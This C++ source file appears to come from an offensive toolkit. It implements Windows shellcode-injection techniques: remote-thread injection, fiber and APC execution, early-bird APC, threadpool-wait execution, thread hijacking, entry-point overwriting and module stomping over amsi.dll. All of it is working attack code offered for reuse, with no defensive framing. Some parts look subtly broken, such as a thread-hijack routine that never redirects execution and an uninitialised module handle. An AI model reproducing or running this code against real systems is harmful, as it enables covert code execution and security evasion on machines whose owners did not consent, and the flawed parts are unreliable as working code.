#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        HANDLE hProcess;
        HANDLE hThread;
        LPVOID lpRemoteBuffer;

        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            lpBuffer,
            dwBufferSize,
            NULL
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Set PAGE_EXECUTE_READWRITE protection.
        DWORD dwOldProtect = PAGE_READWRITE;
        if (!System::Process::VirtualMemoryProtect(
            pProcs,
            hProcess,
            &lpRemoteBuffer,
            &dwBufferSize,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)lpRemoteBuffer,
            NULL
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);

        System::Handle::HandleClose(pProcs, hProcess);
        System::Handle::HandleClose(pProcs, hThread);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
    BOOL ShellcodeExecutionViaFibers(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        // Convert the current thread into a fiber.
        PVOID mainFiber = ConvertThreadToFiber(nullptr);

        LPVOID scAddr = VirtualAlloc(
            NULL,
            dwBufferSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        memcpy(scAddr, lpBuffer, dwBufferSize);

        PVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
        SwitchToFiber(scFiber);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        using MY_NTSTATUS = NTSTATUS(NTAPI*)();

        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        MY_NTSTATUS testAlert = (MY_NTSTATUS)(GetProcAddress(
            GetModuleHandleA("ntdll"),
            "NtTestAlert"
        ));

        LPVOID scAddr = VirtualAlloc(nullptr, dwBufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), scAddr, lpBuffer, dwBufferSize, nullptr);

        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
        QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
        testAlert();

        return TRUE;
    }

    BOOL EarlyBirdAPCQueueCodeInjection(
        Procs::PPROCS pProcs,
        const std::wstring& wTargetProcess,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};

        if (!CreateProcessW(
            nullptr,
            const_cast<LPWSTR>(wTargetProcess.c_str()),
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi
        )) {
            return FALSE;
        }

        HANDLE hProcess = pi.hProcess;
        HANDLE hThread = pi.hThread;

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return FALSE;
        }

        PTHREAD_START_ROUTINE  apcRoutine = (PTHREAD_START_ROUTINE)lpBaseAddr;

        if (System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);
            ResumeThread(hThread);
        }

        CloseHandle(hThread);
        CloseHandle(hProcess);

        return TRUE;
    }

    BOOL ShellcodeExecutionViaCreateThreadpoolWait(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        HANDLE hEvent = CreateEvent(nullptr, FALSE, TRUE, nullptr);
        if (!hEvent)
        {
            return FALSE;
        }

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            NtCurrentProcess(),
            nullptr,
            dwBufferSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            System::Handle::HandleClose(pProcs, hEvent);
            return FALSE;
        }

        RtlMoveMemory(lpBaseAddr, lpBuffer, dwBufferSize);

        PTP_WAIT pThreadPoolWait = pProcs->lpCreateThreadpoolWait((PTP_WAIT_CALLBACK)lpBaseAddr, nullptr, nullptr);
        if (!pThreadPoolWait)
        {
            System::Handle::HandleClose(pProcs, hEvent);
            return FALSE;
        }

        pProcs->lpSetThreadpoolWait(pThreadPoolWait, hEvent, nullptr);
        System::Handle::HandleWait(pProcs, hEvent, FALSE, nullptr);

        System::Process::VirtualMemoryFree(
            pProcs,
            NtCurrentProcess(),
            &lpBaseAddr,
            0,
            MEM_RELEASE
        );
        System::Handle::HandleClose(pProcs, hEvent);

        return TRUE;
    }

    BOOL ThreadExecutionHijacking(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;

        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &lpBaseAddr,
                0,
                MEM_RELEASE
            );
            return FALSE;
        }

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        Thread32First(hSnap, &te32);

        HANDLE hThread;
        while (Thread32Next(hSnap, &te32))
        {
            if (te32.th32OwnerProcessID == dwPID)
            {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                break;
            }
        }

        if (SuspendThread(hThread) == -1)
        {
            return FALSE;
        }

        if (!GetThreadContext(hThread, &context))
        {
            return FALSE;
        }
        if (!SetThreadContext(hThread, &context))
        {
            return FALSE;
        }
        if (!ResumeThread(hThread) == -1)
        {
            return FALSE;
        }

        return TRUE;
    }

    BOOL AddressOfEntryPointInjection(
        Procs::PPROCS pProcs,
        const std::wstring& wTargetProcess,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        PROCESS_BASIC_INFORMATION pbi;
        DWORD dwReturnLength = 0;

        if (!CreateProcessW(
            nullptr,
            const_cast<LPWSTR>(wTargetProcess.c_str()),
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi
        )) {
            return FALSE;
        }

        HANDLE hProcess = pi.hProcess;
        HANDLE hThread = pi.hThread;

        // Get target image PEB address and pointer to image base.
        NTSTATUS status = CallSysInvoke(
            &pProcs->sysNtQueryInformationProcess,
            pProcs->lpNtQueryInformationProcess,
            hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &dwReturnLength
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        #ifdef _WIN64
	        DWORD_PTR dwPebOffset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;
        #else
            DWORD_PTR dwPebOffset = (DWORD_PTR)pbi.PebBaseAddress + 8;
        #endif

        // Get target process image base address.
        LPVOID lpImageBase;
        SIZE_T dwBytesRead;

        #ifdef _WIN64
            if (!System::Process::VirtualMemoryRead(
                pProcs,
                hProcess,
                (PVOID)dwPebOffset,
                &lpImageBase,
                sizeof(PVOID), 
                &dwBytesRead
            )) {
                return FALSE;
            }
        #else
            if (!System::Process::VirtualMemoryRead(
                pProcs,
                hProcess,
                (PVOID)dwPebOffset,
                &lpImageBase,
                sizeof(PVOID),
                &dwBytesRead
            )) {
                return FALSE;
            }
        #endif

        // Read target process image headers
        BYTE headersBuffer[4096] = {};
        if (!System::Process::VirtualMemoryRead(
            pProcs,
            hProcess,
            (PVOID)lpImageBase,
            headersBuffer,
            4096,
            nullptr
        )) {
            return FALSE;
        }

        // Get AddressOfEntryPoint
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + pDosHeader->e_lfanew);
        LPVOID lpCodeEntry = (LPVOID)((LPBYTE)lpImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

        // Write shellcode to image entry point and execute it.
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpCodeEntry,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            return FALSE;
        }

        if (ResumeThread(hThread) == -1)
        {
            return FALSE;
        }

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
    BOOL ModuleStomping(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        wchar_t wModuleToInject[] = L"C:\\windows\\system32\\amsi.dll";

        LPVOID lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            sizeof(wModuleToInject),
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            (LPVOID)wModuleToInject,
            sizeof(wModuleToInject),
            nullptr
        )) {
            return FALSE;
        }

        PTHREAD_START_ROUTINE pThreadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandle(TEXT("Kernel32")),
            "LoadLibraryW"
        );

        HANDLE hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            pThreadRoutine,
            lpRemoteBuffer
        );
        if (!hThread)
        {
            return FALSE;
        }
        if (!System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr))
        {
            return FALSE;
        }

        // Find base address of the injected benign DLL in remote process.
        HMODULE modules[256] = {};
        SIZE_T dwModulesSize = sizeof(modules);
        DWORD dwModulesSizeNeeded = 0;
        DWORD dwModuleNameSize = 0;

        EnumProcessModules(hProcess, modules, dwModulesSize, &dwModulesSizeNeeded);
        SIZE_T dwModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
        HMODULE hRemoteModule;
        CHAR sRemoteModuleName[128] = {};
        for (size_t i = 0; i < dwModulesCount; i++)
        {
            hRemoteModule = modules[i];
            if (GetModuleBaseNameA(hProcess, hRemoteModule, sRemoteModuleName, sizeof(sRemoteModuleName)) != 0)
            {
                if (std::string(sRemoteModuleName).compare("amsi.dll") == 0)
                {
                    break;
                }
            }
        }

        if (!hRemoteModule)
        {
            return FALSE;
        }

        // Get DLL's AddressOfEntryPoint
        DWORD dwHeaderBufferSize = 0x1000;
        LPVOID lpTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHeaderBufferSize);
        if (!System::Process::VirtualMemoryRead(
            pProcs,
            hProcess,
            hRemoteModule,
            lpTargetProcessHeaderBuffer,
            dwHeaderBufferSize,
            nullptr
        )) {
            return FALSE;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + pDosHeader->e_lfanew);
        LPVOID lpDllEntryPoint = (LPVOID)(pNtHeaders->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpDllEntryPoint,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            return FALSE;
        }

        // Execute shellcode from inside the benigh DLl
        if (!System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (PTHREAD_START_ROUTINE)lpDllEntryPoint,
            nullptr
        )) {
            return FALSE;
        }

        return TRUE;
    }
}